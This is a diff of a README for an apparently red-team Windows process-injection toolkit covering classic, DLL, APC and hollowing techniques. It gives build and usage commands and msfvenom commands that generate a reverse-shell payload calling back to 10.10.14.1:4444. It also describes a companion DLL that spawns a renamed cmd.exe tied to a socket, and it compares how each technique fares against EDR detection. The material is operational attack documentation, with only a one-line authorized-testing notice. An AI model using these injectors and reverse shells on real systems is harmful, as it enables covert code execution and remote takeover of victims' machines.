@@ -1,55 +1,91 @@
 # Process Injection
 
-Inject shellcode or DLLs into a running process to execute code in its context.
+Inject shellcode or DLLs into a running Windows process to execute code in its context. All examples target **x64**.
 
-**MITRE ATT&CK**: T1055  
-**Severity**: HIGH
+**MITRE ATT&CK**: T1055
 
 ## Files
 
 | File | Technique | ATT&CK Sub |
 |------|-----------|------------|
-| [`classic_injection.c`](classic_injection.c) | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` | T1055.003 |
-| [`dll_injection.c`](dll_injection.c) | Write DLL path + `CreateRemoteThread` calling `LoadLibraryA` | T1055.001 |
-| [`apc_injection.c`](apc_injection.c) | `VirtualAllocEx` + `WriteProcessMemory` + `QueueUserAPC` | T1055.004 |
-| [`process_hollowing.c`](process_hollowing.c) | CreateProcess SUSPENDED → NtUnmapViewOfSection → write PE → ResumeThread | T1055.012 |
-| [`shellcode_runner.c`](shellcode_runner.c) | VirtualAlloc RWX → copy shellcode → execute (self-injection, file or embedded) | T1055 |
+| [`classic_injection.c`](classic_injection.c) | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread(entry = shellcode)` | T1055.002 |
+| [`dll_injection.c`](dll_injection.c) | Write DLL path + `CreateRemoteThread(entry = LoadLibraryA)` | T1055.001 |
+| [`apc_injection.c`](apc_injection.c) | `VirtualAllocEx` + `WriteProcessMemory` + `QueueUserAPC` on every thread | T1055.004 |
+| [`process_hollowing.c`](process_hollowing.c) | `CreateProcess SUSPENDED` -> `NtUnmapViewOfSection` -> map payload PE (relocations + imports) -> resume | T1055.012 |
+| [`shellcode_runner.c`](shellcode_runner.c) | Local shellcode exec: `VirtualAlloc(RW)` -> copy -> `VirtualProtect(RX)` -> run (**NOT remote injection** — self-contained test harness) | T1055 base |
 
-## Build
+All injectors (classic + apc) use shellcode built with `EXITFUNC=thread` so the target process survives after the payload runs. Default payload = `WinExec("calc.exe", 0)`.
+
+## Build (Linux cross-compile)
 
 ```bash
-x86_64-w64-mingw32-gcc -o inject.exe classic_injection.c
-x86_64-w64-mingw32-gcc -o dll_inject.exe dll_injection.c
-x86_64-w64-mingw32-gcc -o apc_inject.exe apc_injection.c
+sudo apt install -y mingw-w64 && \
+  for f in classic_injection apc_injection dll_injection process_hollowing shellcode_runner; do \
+    x86_64-w64-mingw32-gcc -o $f.exe $f.c -lpsapi; \
+  done
+```
+
+## Build (Windows MSVC)
+
+In the x64 Native Tools Command Prompt for VS 2022:
+
+```
+cl classic_injection.c  /Fe:inject.exe
+cl dll_injection.c      /Fe:dll_inject.exe  psapi.lib
+cl apc_injection.c      /Fe:apc_inject.exe
+cl process_hollowing.c  /Fe:hollow.exe
+cl shellcode_runner.c   /Fe:runner.exe
 ```
 
 ## Usage
 
-```bash
-# Shellcode injection (embeds calc shellcode by default)
-inject.exe <PID>
-inject.exe notepad.exe
-
-# DLL injection
-dll_inject.exe <PID> C:\full\path\to\payload.dll
-
-# APC injection (target must have alertable threads)
-apc_inject.exe <PID>
+```
+inject.exe       <PID|name>                 # shellcode -> target (calc pops, target survives)
+dll_inject.exe   <PID> <absolute DLL path>  # DLL loaded in target, verified via module list
+apc_inject.exe   <PID>                      # APC sprayed on all threads
+hollow.exe       <payload.exe> [host.exe]   # host hollowed with payload (default host: svchost.exe)
+runner.exe       [shellcode.bin] [thread]   # local shellcode test (self-injection)
 ```
 
-## When to Use Each
+## Customizing the payload
+
+Replace the embedded shellcode in `classic_injection.c` or `apc_injection.c`:
+
+```bash
+# calc pop (safe for demo)
+msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c
+
+# reverse shell
+msfvenom -p windows/x64/shell_reverse_tcp \
+         LHOST=10.10.14.1 LPORT=4444 \
+         EXITFUNC=thread -f c
+```
+
+**Always use `EXITFUNC=thread`.** The default `EXITFUNC=process` calls `ExitProcess()` on the target host after the payload runs — your target crashes.
+
+## When to use each
 
 | Technique | Pros | Cons |
 |-----------|------|------|
-| **Classic (CreateRemoteThread)** | Most reliable, works on most processes | Creates visible thread, detected by EDR |
-| **DLL Injection** | Payload is a compiled DLL (easier to write complex payloads) | DLL on disk, LoadLibrary logged |
-| **APC Injection** | Stealthier, no new thread | Only fires when target thread enters alertable wait |
+| **Classic (CreateRemoteThread)** | Reliable, works on most processes | New thread with unbacked RWX start address is a loud EDR signal |
+| **DLL Injection** | Payload is a compiled DLL (easier to write complex logic) | DLL on disk; `LoadLibrary` triggers ETW `ImageLoad` events |
+| **APC Injection** | No new thread created | Only fires when a target thread enters an alertable wait |
+| **Process Hollowing** | Payload runs under a legitimate process name | Complex (relocations + imports), unusual process-tree pattern |
+| **Shellcode Runner** (self-injection) | Simplest shellcode test; validates msfvenom output before injection | Not a remote-injection primitive |
 
-## Customizing Shellcode
+## Making the child process identifiable in Task Manager
 
-Replace the embedded shellcode in `classic_injection.c` or `apc_injection.c`:
+Default msfvenom shellcode (`CMD=calc.exe`) spawns `calc.exe` — looks identical to any normal calc. To get a child that's **clearly yours** in Task Manager (big-text "RevShell - WinCmd Proc" + Image Name `revShell.exe`), use `dll_injection.c` with the companion DLL from `../../../thick-client/payload/proc-injection-2/`:
+
 ```bash
-# Generate with msfvenom
-msfvenom -p windows/x64/exec CMD=calc.exe -f c
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f c
+# victim side
+dll_inject.exe <PID> C:\path\to\revshell_pure_dll.dll
 ```
+
+That DLL copies `C:\Windows\System32\cmd.exe` next to the host EXE (fallback: `%USERPROFILE%`), patches its `FileDescription` to `"RevShell - WinCmd Proc"`, then spawns the renamed copy with the socket as stdin/stdout. The child is identifiable at a glance in Task Manager's Processes tab under the host app.
+
+See [`../../payload/proc-injection-2/README.md`](../../payload/proc-injection-2/README.md).
+
+## Legal
+
+Authorized testing only.
